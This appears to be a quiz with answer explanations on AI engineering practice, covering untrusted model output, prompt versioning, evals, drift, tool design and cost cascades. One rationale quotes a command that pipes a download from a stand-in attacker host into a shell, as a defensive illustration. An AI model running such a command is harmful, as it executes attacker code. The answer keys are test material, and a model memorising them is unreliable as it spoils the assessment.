stem: An agent generates a URL to fetch and a shell command to run, based on a user's request. What is the underlying security error here?

options.text: Model output is treated as trusted — it flows straight into a network fetch and a shell, so anything influencing the model becomes remote code execution and server-side request forgery
options.why: The model's output is derived from user input and any content it has read, so it is attacker-influenceable. Passing it to `shell=True` and an unrestricted fetch turns influence over text into arbitrary command execution and access to internal network endpoints.

options.text: `shell=True` is unsafe and should be replaced with an argument list to avoid shell interpretation
options.why: Correct advice that removes shell metacharacter injection, and worth doing. It does not help when the command itself is attacker-chosen — an argument list running `curl attacker.com | sh` is just as fatal.

options.text: There is no timeout on the fetch, so a slow endpoint can hang the agent indefinitely
options.why: A genuine robustness bug that will eventually bite in production. It is availability rather than security, and it is trivial beside handing a shell to model-generated text.

options.text: The plan is not validated against a schema, so a malformed step will raise an exception
options.why: Schema validation is worth adding and will catch structural problems. Validating the shape of a step does nothing about its content, and a perfectly well-formed step can still contain a destructive command.

explanation: The error is a trust classification: model output is being treated as trusted control flow when it is derived from untrusted input. Everything the model produces is a function of the user's request and whatever content it has read — web pages, documents, tool results — all of which can be attacker-controlled. So model output belongs in the same category as a form field, and the security question is what your code does with it. Here it is passed to a shell, which is remote code execution, and to an unrestricted HTTP fetch, which is server-side request forgery: a generated URL pointing at a cloud metadata endpoint or an internal admin service reaches things no external attacker should touch. The fix is to constrain the action space rather than to inspect the strings. Do not let the model produce commands; let it choose from a fixed set of parameterised operations you implemented, with typed arguments you validate — the model selects `search_logs(service, since)`, it does not write shell. For fetches, use an allow-list of permitted hosts and block private address ranges and metadata endpoints explicitly, resolving DNS before connecting to avoid rebinding. Where arbitrary code genuinely must run, put it in an isolated sandbox with no network and no credentials, as a separate control. Two habits worth carrying. Trace every path from model output to a sink — shell, SQL, HTTP, filesystem, eval, deserialisation — and treat each as you would an untrusted request parameter. And remember that the strength of the boundary should not depend on the model behaving well, because a model that behaves well 99.9% of the time is not a security control.
keyTakeaway: Model output is untrusted input. Never let it reach a shell, a query, or an arbitrary URL — let it choose among operations you implemented.

topic: Working With AI as an Engineer
stem: A team stores prompts in a database so non-engineers can edit them without a deploy. Quality regressions start appearing with no obvious cause. What went wrong?

options.text: Prompts became untracked production logic — changes bypass review, version history, evals and rollback, so a regression has no diff to inspect and no version to revert to
options.why: A prompt determines behaviour as directly as code does, so editing it live is a production change made without any of the controls that make production changes safe. Nothing records what changed, when, or by whom, which is why the regressions look causeless.

options.text: Non-engineers lack the expertise to write effective prompts, so quality naturally degraded
options.why: Domain experts often write better prompts than engineers, since they understand the task. The problem is the missing pipeline around the change, not the identity of the person making it.

options.text: Database-stored prompts cannot be prompt-cached, increasing cost and latency
options.why: Prompts loaded from a database cache normally, since caching depends on the token prefix rather than where the string came from. This raises an unrelated performance concern.

options.text: The prompts should be in the database but need an approval workflow before taking effect
options.why: An approval step is a genuine improvement and part of the answer. On its own it adds a gate without version history, eval gating or rollback, so a bad approved change is still hard to detect and hard to undo.

explanation: A prompt is production logic, and the useful reframing is to ask which controls you would demand for a code change that altered behaviour this much. Version control, so every change has an author, a timestamp and a diff. Review, so a second person sees it. Automated evals as a gate, so a change that degrades measured quality does not ship. Staged rollout, so a regression reaches few users. Instant rollback to a known-good version. Editing a live database row provides none of these, which is why the regressions are mysterious — there is no artefact recording what changed. The goal of letting non-engineers edit is legitimate and worth keeping, so build a path that preserves it: store prompts in the repository and give domain experts an interface that opens a pull request, or keep a prompt-management system that provides versioning, eval gating and rollout as first-class features. Either way the properties matter more than the storage location. Two supporting practices. Version prompts explicitly and record the version with every request in your traces, so a quality question can be answered by correlating outcomes with prompt version rather than by guesswork. And treat the prompt, the model version and the tool definitions as one deployable unit, because changing any of them changes behaviour and evaluating them independently misses their interactions — a prompt tuned for one model can regress on another, and a tool description change can alter tool selection without a line of prompt text moving.
keyTakeaway: Prompts are production logic. Demand the same controls as code: version history, review, eval gating, staged rollout and instant rollback.

topic: Working With AI as an Engineer
subtopic: When not to use an LLM
stem: A team proposes an LLM to validate that submitted addresses are well-formed and to normalise them to a standard format, at 2M requests/month. What should you ask first?

options.text: Whether a deterministic library or address-validation API already solves this — the task has a correct answer, established tooling, and needs neither language understanding nor tolerance for variation
options.why: Address normalisation is a solved problem with authoritative datasets and deterministic implementations that are faster, cheaper, auditable and correct by construction. Reaching for an LLM on a task with a known algorithm adds cost, latency and non-determinism for nothing.

options.text: Whether the eval set is large enough to measure accuracy at this volume
options.why: A good question once you have decided an LLM is the right tool, and evals would certainly be needed. Asking it first accepts the premise and starts optimising an approach that may not be warranted at all.

options.text: Whether a smaller model could handle it more cheaply at 2M requests/month
options.why: Right instinct about right-sizing, applied one level too late. Choosing between models presumes a model is needed, when the prior question is whether the task requires one.

options.text: Whether addresses contain PII that would need redaction before being sent to a provider
options.why: A legitimate compliance consideration that would need addressing. It is a constraint on the implementation rather than the question of whether the implementation should exist in this form.

explanation: The most valuable habit in AI engineering is asking whether the problem needs a model at all, because the failure mode of the moment is applying a probabilistic, expensive, non-deterministic tool to problems with exact solutions. LLMs earn their cost where the input is genuinely unstructured, where the task requires world knowledge or language understanding, where the space of valid outputs is too large to enumerate, or where variation is acceptable. They are the wrong tool where a deterministic algorithm exists, where the answer must be exactly right every time, where auditability matters, or where the same input must always produce the same output. Address validation sits squarely in the second group: there are authoritative postal datasets and mature libraries, results are verifiable, and a wrong normalisation causes a failed delivery. A deterministic implementation is faster, cheaper by orders of magnitude at 2M requests, testable, and does not drift when a provider updates a model. That said, hold the position with nuance rather than as a rule — there is often a genuine hybrid, where the deterministic parser handles the 95% it can and an LLM handles the messy remainder that would otherwise be rejected or sent to manual review. That shape is frequently the best answer: use the cheap exact tool for the bulk, and spend model calls on the residue where its flexibility is actually worth something. Frame the recommendation that way and you get both the reliability and the coverage, which is a more persuasive argument than 'do not use an LLM'.
keyTakeaway: Ask whether the task has a known algorithm before reaching for a model. Often the best design is deterministic for the bulk, LLM for the messy remainder.

topic: Working With AI as an Engineer
stem: An engineer gives a coding agent the task 'improve error handling in the payments module' and gets a large diff touching 40 files, much of it unwanted. What was the mistake?

options.text: The task was underspecified in scope and success criteria — an agent given an open-ended goal will choose its own boundaries, and yours were never stated
options.why: 'Improve' has no definition of done and no scope, so the agent invented both. Naming the files, the specific problem, and the observable criterion for success is what converts an open goal into a task with a checkable result.

options.text: The agent should have been given a smaller model, which would produce more conservative changes
options.why: Model capability does not supply missing scope, and a weaker model given the same instruction produces a differently-wrong large diff. The gap is in the specification, not the capacity.

options.text: The engineer should have reviewed incrementally rather than waiting for the complete diff
options.why: Incremental review is a genuinely good practice and would have caught the drift sooner. It reduces wasted work rather than preventing it, since the agent would still head in an unspecified direction from the first step.

options.text: Error handling is inherently a judgement-heavy task unsuited to delegation
options.why: Overstated — error handling delegates well when the desired behaviour is specified, such as wrapping a particular client's calls in a retry with defined semantics. The difficulty is the vagueness, not the subject matter.

explanation: Delegating to an agent is delegating to a capable colleague with no context about your intentions, no history with the codebase, and no ability to read the room. What makes the difference is the same thing that makes human delegation work: a clear statement of scope, the specific problem, and how you will know it is done. Compare the vague instruction with 'in `payments/stripe_client.py`, wrap the three network calls in the existing retry decorator, treating 429 and 5xx as retryable and 4xx as terminal; add tests covering both paths; do not modify other files'. The second names the boundary, the desired behaviour, and a verifiable criterion, so the result is reviewable against something. Two structural habits amplify this. Prefer many small, verifiable tasks to one large open one, because errors compound over long autonomous runs and a small diff is genuinely reviewable while a 40-file diff will be skimmed. And invest in the feedback the agent can act on — a fast test suite, type checking, linting — since an agent that can check its own work against an objective signal outperforms one relying on its own judgement by a wide margin. Two further points. Say what not to do, since scope creep is the characteristic failure and an explicit boundary is cheap to state. And treat a bad result as a specification bug first: the useful question after a wrong diff is 'what did I not say?', which usually produces a better prompt and, often, a realisation that you had not decided the answer yourself.
keyTakeaway: An agent given an open goal invents its own scope. State the files, the desired behaviour, the success criterion, and the boundary.

topic: Working With AI as an Engineer
stem: A user reports that an AI feature gave a wrong answer. You have the trace. Re-running the same input produces a correct answer. How do you proceed?

options.text: Treat the single case as one sample — run the input many times to estimate the failure rate, then use the trace to form a hypothesis about which step is unstable
options.why: One run tells you nothing about frequency in a stochastic system, and a single passing re-run is not evidence the bug is gone. Estimating the rate turns an anecdote into a measurement you can act on and track.

options.text: Close the report as unreproducible, since the system now returns the correct answer
options.why: Applies deterministic-system logic to a stochastic one. In an LLM system, a bug that occurs 15% of the time will pass a single re-run most of the time and continue affecting a substantial fraction of users.

options.text: Lower the temperature to zero so the behaviour becomes reproducible, then debug normally
options.why: Temperature zero reduces variance without eliminating it, and it changes the system you are debugging — the production configuration is what users experience, so a bug that disappears at temperature zero has not been explained.

options.text: Add the case to the eval set and check whether the next model or prompt change fixes it
options.why: Adding it to the eval set is exactly right and should happen. Waiting passively for a future change to fix it is not a diagnosis, and a single case in an eval set will pass or fail stochastically unless you run it repeatedly.

explanation: Debugging a stochastic system requires replacing the binary of reproducible and unreproducible with a rate. The first move is to run the failing input a meaningful number of times — twenty or fifty — and record how often it fails. That single step converts an unactionable anecdote into a number: 2% is a different problem from 40%, and it gives you the baseline against which any fix must be measured, since without it you cannot distinguish a real improvement from a lucky run. Then use the trace to localise. In a multi-step system, examine each stage independently: did retrieval return the right documents, did the tool call have correct arguments, did the model misread correct context? Often the variance is concentrated in one step, and that step is where you should look. Then form a hypothesis and test it by varying one thing at a time, measuring the rate each time rather than checking whether a single run passes. Two habits that make this sustainable. Add the case to the eval set with a required pass rate rather than a boolean, so the suite tracks 'this input succeeds at least 95% of the time' and can detect a regression. And log enough per request to reconstruct without re-running: the full rendered prompt, the model version, sampling parameters, retrieved chunk IDs and tool arguments, because the run that failed is gone and its trace is the only evidence it existed. The general shift is from 'does it work?' to 'how often, and where does the variance live?'.
keyTakeaway: Replace reproducible/unreproducible with a rate. Run it fifty times, localise the variance to a step, and add it to evals with a pass-rate threshold.

topic: Working With AI as an Engineer
stem: You are asked to give a launch date for an AI feature. The model works on most test cases but quality on the long tail is unknown. What is the most useful thing to say?

options.text: Propose shipping behind a flag to a small cohort with quality monitoring, and give a date for that — then a decision point on wider rollout once you have real-traffic data
options.why: It gives the date being asked for while being honest that long-tail quality is unknowable from test cases. Staging the commitment turns an unanswerable question into two answerable ones, and the first stage is what produces the data for the second.

options.text: Give a date based on the current pass rate, noting that quality may vary in production
options.why: Commits to a full launch on evidence that does not cover the case in question, and the caveat will not be remembered when the tail causes problems. It converts a known unknown into an unstated risk.

options.text: Explain that AI features cannot be given firm dates because quality is inherently unpredictable
options.why: Reads as evasion and is not really true — you can commit to a limited launch with confidence. Refusing to date anything removes you from the planning conversation without protecting the outcome.

options.text: Ask for two more weeks to expand the eval set before committing to any date
options.why: More eval coverage is valuable and you should build it. But a bigger eval set is still your guess at the distribution, and no amount of offline testing substitutes for real traffic on the long tail.

explanation: The underlying skill is recognising which uncertainties can be resolved before launch and which can only be resolved by launching, then structuring the commitment around that distinction. Long-tail quality is the second kind: your eval set is a sample of what you imagined, and real users generate inputs you did not, so no amount of pre-launch testing settles it. Trying to eliminate that uncertainty before shipping is an expensive way to remain uninformed. So propose a staged commitment. Ship behind a flag to a small percentage or an internal cohort on a date you can hold, with quality monitoring, a feedback path, and a defined kill switch. Name what you will measure and the threshold that decides expansion, then give a decision point rather than a launch date for the wider rollout. This is more useful to the person asking than either a confident date you might miss or a refusal, because it lets them plan around a real sequence of events. Two things make it land. Be explicit about what you are confident in and what you are not — 'confident on the common cases, unknown on the tail' is a precise statement people can work with, and it is far stronger than hedging everything equally. And bring the monitoring plan with you, since the reason a staged launch is safe is that you will notice problems, and stating how you will notice is what makes the proposal credible rather than a way of avoiding the question.
keyTakeaway: Separate uncertainties you can resolve before launch from those only traffic resolves. Commit firmly to a staged launch, with a stated metric and decision point for the rest.

stem: You are building the first eval set for a document-extraction feature. You have 50,000 unlabelled production documents and limited labelling budget. How should you choose what to label?

options.text: Stratify — sample across document types, sources and difficulty, deliberately over-sampling known failure modes and edge cases rather than sampling uniformly
options.why: Uniform sampling spends most of the budget confirming the easy majority you already handle. Stratifying guarantees coverage of the categories where failures actually occur, which is where an eval set produces signal.

options.text: Sample randomly, so the eval set matches the production distribution and the measured accuracy is unbiased
options.why: Distribution-matching gives an unbiased headline number, which is genuinely useful for reporting. It is a poor use of a limited budget for improving the system, since rare-but-important categories may get almost no representation.

options.text: Label the documents where the current system's confidence is lowest, concentrating on likely failures
options.why: Active learning of this kind is efficient for finding errors and worth using as one input. On its own it biases the set toward what the current model finds hard, so it will not detect regressions on cases it currently handles confidently.

options.text: Label the most recent documents, since they best represent current production traffic
options.why: Recency helps with drift and keeping the set current matters. It is orthogonal to coverage, though — a recent sample can miss the same rare categories a random sample would.

explanation: An eval set is a measuring instrument, and its value comes from where it is sensitive rather than from resembling production. Stratified sampling is the right default: enumerate the dimensions that matter — document type, source system, language, length, format quality, and known problem categories — and deliberately fill cells across them. Over-sample the hard and rare cases, because those are where systems fail and where a change is most likely to regress something. Keep a note of the true production proportions so you can reweight when you need an unbiased headline accuracy; you get both numbers that way, which is better than choosing. Two structural decisions to make early. Split the set: a small golden set you never modify and never tune against, so you can detect overfitting to your own measurements, alongside a growing working set you extend with every production failure — that second habit, turning every bug into a permanent case, is what makes the suite compound in value over time. And decide what a label is: for extraction it may be field-level ground truth, which is expensive but gives per-field precision and recall rather than a document-level pass or fail, and that granularity is what tells you which field to fix. Finally, invest in labelling quality over quantity. A few hundred carefully-labelled examples with a documented labelling guide beats thousands of noisy ones, because a noisy eval set puts a ceiling on the improvements you can detect, and you will chase differences that are really label errors.
keyTakeaway: Stratify and over-sample hard cases — an eval set should be sensitive, not representative. Keep an untouched golden set, and grow the rest from real failures.

stem: A prompt change improves the offline eval score from 82% to 89%. Shipped to production, user satisfaction drops. What is the most likely explanation?

options.text: The eval set does not capture what users value — it may reward correctness on a distribution or dimension that diverges from real usage, such as accuracy at the expense of length, tone or latency
options.why: Offline scores measure the proxy you chose, and a change can optimise that proxy while degrading something the metric does not cover. A more accurate but far more verbose or slower answer is a common instance of exactly this.

options.text: The offline improvement was within noise, and the true quality did not change
options.why: Worth ruling out, and a seven-point move on a small set can be noise. Noise would predict no change in satisfaction rather than the consistent drop described, so it does not explain the direction.

options.text: The production model version differs from the one used in offline evaluation
options.why: A real and embarrassing failure mode worth checking first as a hygiene step. It would be a configuration bug rather than the systematic gap between offline proxies and user value that the pattern suggests.

options.text: Users are resistant to change and satisfaction will recover once they adapt
options.why: Occasionally true for interface changes, and novelty effects are real in both directions. As a first explanation it dismisses the signal, which is the least useful response to evidence that your metric and your users disagree.

explanation: Offline evals measure a proxy and the proxy is never the goal, so the interesting engineering question is where the two diverge. Common gaps: distribution, where the eval set is not what users actually send; dimension, where you score correctness while users also care about length, tone, latency, formatting and confidence; and framing, where a graded rubric rewards thoroughness that users experience as verbosity. A prompt that adds detailed reasoning to every answer will often score better on an accuracy rubric and worse with users who wanted a sentence. That divergence is information, and the productive response is to close the loop rather than to distrust one side. Sample the production interactions where satisfaction was low and inspect them against the eval rubric — the mismatch is usually visible immediately, and those cases become new eval cases that encode the dimension you were missing. Then extend the rubric so the eval can detect this class of regression next time; an eval suite that cannot fail for the reason your users are unhappy will let the same mistake through repeatedly. Two supporting practices. Run both kinds of measurement as a matter of course: offline evals as a fast pre-merge gate, and online metrics — explicit feedback, implicit signals like retries, escalations and abandonment, and A/B tests for meaningful changes — as the arbiter of whether something helped. And ship significant prompt changes behind a flag with a comparison rather than to everyone, so an offline win that turns out to be an online loss costs a small cohort rather than your whole user base.
keyTakeaway: Offline evals measure a proxy. When offline and online disagree, the eval is incomplete — mine the unhappy cases and extend the rubric.

stem: A content classifier flags policy violations for human review. It runs on 100,000 items/day with a true violation rate of 0.5%. The team reports 94% accuracy and wants to ship. What is the problem?

options.text: Accuracy is meaningless at this class imbalance — always predicting 'no violation' scores 99.5% — so you need precision and recall, and the threshold set by the relative cost of a miss versus a false flag
options.why: With 0.5% positives, a trivial classifier beats the reported 94%, which means the model may be worse than doing nothing. Precision and recall separate the two error types, and their relative cost is what should set the operating point.

options.text: 94% accuracy is too low for a safety-critical classifier and needs to reach at least 99%
options.why: Chases a higher value of a metric that does not describe the problem. A 99% accurate classifier can still be useless here, since a constant 'no' prediction beats it.

options.text: The model should be evaluated on a balanced test set so the classes are equally represented
options.why: Balanced test sets help during training and for comparing models, but evaluating on a balanced set misrepresents production performance — the precision you would actually see at 0.5% prevalence is far lower than a balanced set suggests.

options.text: Human review capacity has not been considered, so the flagged volume may exceed what reviewers can handle
options.why: A genuinely important operational constraint that should shape the threshold, and worth raising. It is downstream of the measurement problem — you cannot size review capacity from an accuracy figure.

explanation: Accuracy is the wrong metric for rare events, and the giveaway arithmetic here is that a classifier which always says 'no violation' achieves 99.5%. So a reported 94% may represent a model actively worse than a constant. Use precision and recall instead, and understand what each means for the product. Recall is the fraction of real violations caught — misses are the violations that reach users, which is usually the expensive failure. Precision is the fraction of flags that are real — false positives consume reviewer time, and at this volume a precision of 10% means reviewers wade through nine irrelevant items for each real one, which destroys the review queue and eventually the reviewers' attention. The threshold between them is a product decision, not a modelling one, and it should be set by the relative cost of the two errors. Frame it concretely: at 0.5% prevalence, 100,000 items contain 500 real violations, so 90% recall at 20% precision means catching 450 and flagging 2,250 items in total. Those are numbers a product owner can reason about, unlike an F1 score. Three further points worth carrying. Report the precision-recall curve rather than a single point, since it lets people choose the operating point knowingly. Use PR-AUC rather than ROC-AUC for imbalanced problems, because ROC looks flatteringly good when negatives dominate. And consider a two-stage design — a high-recall cheap filter followed by a high-precision second pass — which is often how you get an acceptable queue volume without sacrificing coverage.
keyTakeaway: Accuracy is meaningless when one class is rare. Use precision and recall, and set the threshold from the relative cost of a miss versus a false flag.

stem: An AI feature's quality declines gradually over six months with no changes to the prompt, model version, or code. What are the likely causes?

options.text: Input drift and corpus drift — the distribution of user requests shifts, and retrieved content ages or grows stale, so a static system meets a changing world
options.why: Nothing in the system changed, so the change is external: users ask different things as the product and their needs evolve, and a retrieval corpus accumulates outdated documents. Both degrade quality without any deploy.

options.text: The provider silently updated the model despite the version being pinned
options.why: Worth verifying, and unpinned aliases genuinely do change underneath you. A pinned version should not change, and a silent update would typically produce a step change rather than a six-month gradual decline.

options.text: Accumulated technical debt in the prompt from many small edits
options.why: Prompt bloat is a real phenomenon in long-lived systems. The stem states the prompt did not change, which rules this out as the cause here.

options.text: The eval set has become stale, so the measured quality is wrong rather than the actual quality
options.why: A stale eval set is a genuine and closely related problem — it would fail to detect the decline. But it would mean quality looks *unchanged* while degrading, whereas the stem reports a measured decline.

explanation: AI systems degrade without being touched, which is a different maintenance model from ordinary software and worth internalising. Two drifts dominate. Input drift: the questions users ask change as the product changes, as your user base shifts, and as the world moves — a system tuned on last year's requests meets this year's distribution and handles it less well. Corpus drift: for retrieval systems, documents age, new ones arrive unindexed, superseded content stays searchable, and the proportion of stale material rises steadily. Both produce exactly the pattern described. Two more are worth checking: a stale eval set, which does not cause decline but conceals it, so a suite that has not been updated in six months is measuring a distribution that no longer exists; and dependency drift, where tools, APIs and schemas the system calls change their behaviour. The operational response is to treat evals as a living asset. Refresh the set from recent production traffic on a schedule, not just when something breaks. Monitor input distribution directly — embedding-space drift or simple category counts will show you the shift before quality metrics do, which buys you time to respond. Run corpus hygiene as a recurring job that finds stale, orphaned and superseded documents. And track quality continuously on production samples rather than only in pre-merge gates, since the whole point is that this decline happens with no deploy to trigger a gate. The mental model to carry: an AI feature is a fit between a static system and a moving distribution, so it needs maintenance even when nothing about it changes.
keyTakeaway: AI systems decay untouched, because the input distribution and the corpus move. Refresh evals from recent traffic and monitor drift directly.

stem: An agent has 60 tools, each a thin wrapper over one API endpoint. It frequently picks the wrong tool and chains several calls where one would do. What is the fix?

options.text: Design tools around the tasks the agent performs rather than mirroring the API surface — fewer, higher-level tools that each complete a meaningful unit of work
options.why: Sixty near-identical descriptions make selection genuinely hard, and endpoint-shaped tools force the agent to compose sequences that could be one call. Task-shaped tools reduce both the selection space and the number of steps where errors compound.

options.text: Improve each tool's description so the model can distinguish them more reliably
options.why: Better descriptions do help and are worth writing regardless. They cannot fix a surface where sixty options overlap semantically, and they do nothing about the multi-call chaining that the granularity causes.

options.text: Add a routing step that selects a subset of relevant tools before the main agent call
options.why: Dynamic tool selection is a legitimate technique for large tool sets and genuinely helps at scale. It manages the symptom while leaving the underlying mismatch between API shape and task shape in place.

options.text: Group the tools into namespaces so related tools are visually clustered in the schema
options.why: Naming conventions and prefixes do modestly aid selection and are cheap to adopt. Organisation of the list is not the constraint — the number of choices and their granularity is.

explanation: Tools are an interface designed for a particular consumer, and the mistake is designing them for the API rather than for the agent. Auto-generating one tool per endpoint produces a surface that mirrors your service boundaries, which are an artefact of how you built the backend and have nothing to do with the tasks the agent performs. The consequences are predictable: selection accuracy falls as options multiply and overlap, and because each tool does a fragment of a job, the agent must chain several calls, which multiplies the per-step error rate and burns context on intermediate results. Design instead from the agent's tasks. If the agent's job is 'find the customer's recent orders and their status', that should be one tool, even if it calls four endpoints internally — the composition logic belongs in your code, where it is deterministic and testable, rather than in the model's reasoning where it is probabilistic. Aim for tools that complete a meaningful unit of work and return exactly what is needed to decide the next step. Practical guidance: keep the set small enough that descriptions are clearly distinguishable, and if two tools need a paragraph to tell apart, they should probably be one tool with a parameter. Name them for the task rather than the endpoint. Where a large surface is genuinely unavoidable, then add dynamic selection as a second-order fix. And evaluate tool-selection accuracy explicitly, because it is a distinct failure mode from reasoning quality and it responds to interface design rather than to better prompting.
keyTakeaway: Design tools around tasks, not endpoints. Put composition in your code where it is deterministic, not in the model's reasoning where it compounds errors.

stem: An agent workflow takes 20 minutes, calls external APIs, and occasionally needs human approval mid-run. It currently runs in a single process holding state in memory. What is the structural problem?

options.text: State lives only in memory, so a deploy, crash or restart loses everything — and a human approval step can outlast any process, so the workflow needs durable, resumable execution
options.why: A 20-minute process is guaranteed to be interrupted eventually by ordinary deploys, and a human approval can take hours or days. Both require the workflow's state to survive the process, which in-memory state cannot do.

options.text: Twenty minutes is too long for a single request; the workflow should be split into shorter units
options.why: Decomposition is often good design and would help. Shorter units held in memory still lose state on restart, and it does not address the human approval step that can span days regardless of how the work is divided.

options.text: External API calls should be made asynchronously so the process is not blocked while waiting
options.why: Async I/O improves resource efficiency and concurrency, which matters at scale. It is a performance concern and does nothing about durability — an async process that dies loses its state just as completely.

options.text: The agent should checkpoint progress to a database at each step so it can resume
options.why: Very close, and checkpointing is exactly the right mechanism. As stated it describes building the durability yourself, which is a substantial and subtle piece of infrastructure that existing workflow engines already provide correctly.

explanation: Long-running agent workflows are distributed systems problems wearing an AI hat, and the properties they need are the ones workflow engines have provided for years. Any process running for 20 minutes will be interrupted — deploys are routine, nodes are preempted, pods are rescheduled — so state that exists only in memory is state you will lose, and losing it mid-workflow means either restarting from scratch, which repeats side effects, or abandoning the run. A human approval step makes this unavoidable rather than merely likely: no process should stay resident for hours waiting on a person. What you need is durable execution: every step's result persisted as it completes, the workflow resumable from its last checkpoint on a different machine, and the ability to suspend indefinitely on an external signal and wake when it arrives. Building this yourself means handling checkpointing, idempotency of replayed steps, versioning of in-flight workflows when you deploy a change, timeouts, and retries with exactly-once semantics for side effects — which is why using an engine such as Temporal, Restate or a cloud step-function service is usually the right call. Two design consequences follow. Steps must be idempotent, because resumption may replay the last step whose completion was not recorded, and this is the detail teams most often get wrong. And side effects should be recorded before they are visible where possible, so a replay can detect that the external call already happened rather than making it twice — the same reasoning as the outbox pattern, applied to agent steps.
keyTakeaway: A 20-minute workflow with a human step is a durable-execution problem. Persist each step, make steps idempotent, and use an engine rather than rebuilding one.

stem: Two agent designs: one produces a full plan upfront then executes it; the other decides each next action after observing the last result. What are the tradeoffs?

options.text: Upfront planning is reviewable and cheaper but brittle when reality differs from assumptions; reactive loops adapt but cost more per step and can lose sight of the overall goal
options.why: A plan made before any observation encodes assumptions that may be wrong, though it can be inspected and approved before anything executes. Deciding step by step handles surprises but pays a model call per step and drifts without periodic re-anchoring to the objective.

options.text: Upfront planning is more accurate because the model reasons about the whole task at once; reactive loops are greedy and produce locally optimal choices
options.why: Overstates planning's advantage. A plan built without observing the environment is frequently wrong in ways that cannot be anticipated, and reactive loops informed by real results often outperform it on unfamiliar tasks.

options.text: Reactive loops are strictly better for tool-using agents, since tool results cannot be predicted in advance
options.why: Too absolute. Where the environment is predictable, a plan gives cheaper execution and — crucially — something a human can review before any action is taken, which matters for consequential work.

options.text: Upfront planning requires a more capable model, while reactive loops work with smaller models
options.why: Planning is demanding, but reactive loops need strong per-step judgement and error recovery too. Model capability is not the axis that distinguishes these architectures.

explanation: The two designs trade adaptability against predictability, and the right choice follows from how well you can model the environment in advance. Upfront planning shines when the task is familiar and the environment predictable: it produces an artefact a human can review and approve before anything happens, which is a significant safety property for consequential work; it costs one reasoning call rather than one per step; and it makes the agent's intent legible, so a wrong plan is caught early and cheaply. Its weakness is that it commits before observing, so any assumption that turns out false invalidates the remainder. Reactive loops — the ReAct shape of think, act, observe, repeat — handle surprise naturally, which is why they dominate for exploratory work. They cost a model call per step, accumulate context, and are prone to goal drift, where the agent optimises the immediate obstacle and loses the objective. In practice the strongest designs combine them: plan first, execute reactively, and re-plan when observations contradict the plan. That gives you the reviewable artefact and the legible intent while retaining the ability to adapt, and the re-planning trigger is the interesting design decision — too eager and you lose the plan's value, too reluctant and you execute a plan you know is wrong. Two supporting practices: keep the plan in externalised state that the agent re-reads and updates, so it survives compaction and stays a live document rather than a distant memory; and re-anchor the goal periodically in reactive loops, since the original instruction gets proportionally quieter as history grows.
keyTakeaway: Plans are reviewable and cheap but assume; reactive loops adapt but drift. Plan, execute reactively, and re-plan when observations contradict the plan.

references.label: Yao et al., 'ReAct: Synergizing Reasoning and Acting in Language Models'

stem: Your company has 6 agent applications, each with its own hand-written integrations to the same 10 internal systems. Adding an integration means implementing it 6 times. What does adopting a standard tool protocol such as MCP buy, and what does it not solve?

options.text: It decouples tool implementation from agent implementation, so each integration is written once and consumed by any client — but it does not make the tools well-designed, and a badly-shaped tool is badly-shaped over any protocol
options.why: The protocol solves the N-times-M integration problem by standardising the interface between agents and tools. Tool quality — description, granularity, error messages, result size — is orthogonal and remains entirely your responsibility.

options.text: It improves agent accuracy, since standardised schemas are easier for models to interpret
options.why: A consistent schema format helps marginally, but accuracy is driven by how well the tool matches the task and how clear its description is. A standard envelope around a confusing tool does not clarify it.

options.text: It provides authentication and authorisation for tool access, removing the need for per-tool permission handling
options.why: Protocols define how auth is carried rather than what your policy should be. You still decide which agent may access which system with what scope, and that policy work is the substantial part.

options.text: It allows tools to be swapped between vendors' models without changes, avoiding lock-in
options.why: Portability across clients is a genuine benefit and part of the value. Framing it as vendor lock-in avoidance undersells the main win, which is eliminating duplicated integration work inside your own organisation.

explanation: This is an ordinary integration-architecture problem and it should be recognised as one. Six applications times ten systems is sixty integrations to write and maintain, with divergent behaviour and bugs fixed in one place and not the others. A standard protocol — the Model Context Protocol being the current common answer — turns that into ten servers and six clients, so each integration is implemented once, versioned once, and consumed everywhere. The benefits are the ones you would expect from any interface standardisation: less duplicated work, consistent behaviour across applications, a single place to fix a bug or add a capability, and independent deployment of tools from the agents that use them. It also makes tools reusable by clients you have not built yet, which is where the ecosystem argument comes from. Be equally clear about what it does not do. It does not design your tools: granularity, naming, description quality, result size and error message usefulness are all still yours to get right, and those are what determine whether an agent uses the tool well. It does not decide your authorisation policy. It does not remove the need to evaluate tool usage. And it adds operational surface — servers to run, version, secure and monitor — which is a real cost worth naming rather than glossing over. The instinct worth carrying is to treat agent tooling with the same architectural seriousness as any other service interface, because that is what it is: an API whose primary consumer happens to be a model.
keyTakeaway: A tool protocol solves N-times-M integration duplication. It does not design your tools — granularity, descriptions and errors are still your problem.

stem: A support triage system runs a large model on all 500,000 tickets/month. Analysis shows 85% of tickets are routine and unambiguous. How would you restructure it?

options.text: Cascade — run a small model first and escalate to the large one only when the small model's confidence is low or the case is flagged ambiguous
options.why: It matches spend to difficulty, sending the easy 85% down a cheap fast path while preserving large-model quality where it is needed. The design question becomes the escalation criterion, which is measurable and tunable.

options.text: Replace the large model with a small one entirely, accepting a lower accuracy on the difficult 15%
options.why: Discards quality on precisely the tickets where quality matters most — the ambiguous ones are where misrouting costs the most in customer time and rework. It takes the cost saving without the mechanism that protects the hard cases.

options.text: Batch the tickets and process them through the batch API at a discount
options.why: Batch pricing is a real and substantial discount, and worth using for anything not latency-sensitive. Ticket triage usually is latency-sensitive, since routing delays the customer's first response.

options.text: Fine-tune the large model on historical tickets to improve accuracy and reduce prompt size
options.why: Fine-tuning can shorten prompts and improve quality, and may be worthwhile later. It optimises quality when the problem stated is cost, and it keeps every ticket on the expensive model.

explanation: Cascading is the highest-leverage cost pattern in LLM systems because real workloads are overwhelmingly easy with a difficult tail, and paying frontier prices for the easy majority is the default mistake. The structure: a cheap model handles every request first, and an escalation criterion decides which cases go to the expensive model. With 85% routine, you eliminate most of your spend while the hard cases still receive full capability — and latency improves for the majority as a bonus. The engineering work is the escalation criterion, and it deserves care. Options include the small model's own expressed confidence, which is convenient but poorly calibrated on its own; a separate cheap classifier trained to predict whether the small model will be right, which tends to work better; agreement between two small models; or rules based on ticket properties such as length, unfamiliar vocabulary, or lack of a matching category. Validate the criterion against a labelled set, and measure both the escalation rate and the accuracy on cases that were *not* escalated, because that second number is where the risk lives — a criterion that quietly keeps hard cases on the cheap path is how quality degrades invisibly. Two extensions. Cascade to a non-model path where possible: many routine tickets match a rule or a previous ticket, and a cheap retrieval lookup can resolve them for near zero. And revisit the tiering periodically, since model capability and pricing move and today's escalation threshold is next quarter's overspend.
keyTakeaway: Real workloads are mostly easy with a hard tail. Cascade cheap-first with a validated escalation criterion — and watch accuracy on what you didn't escalate.

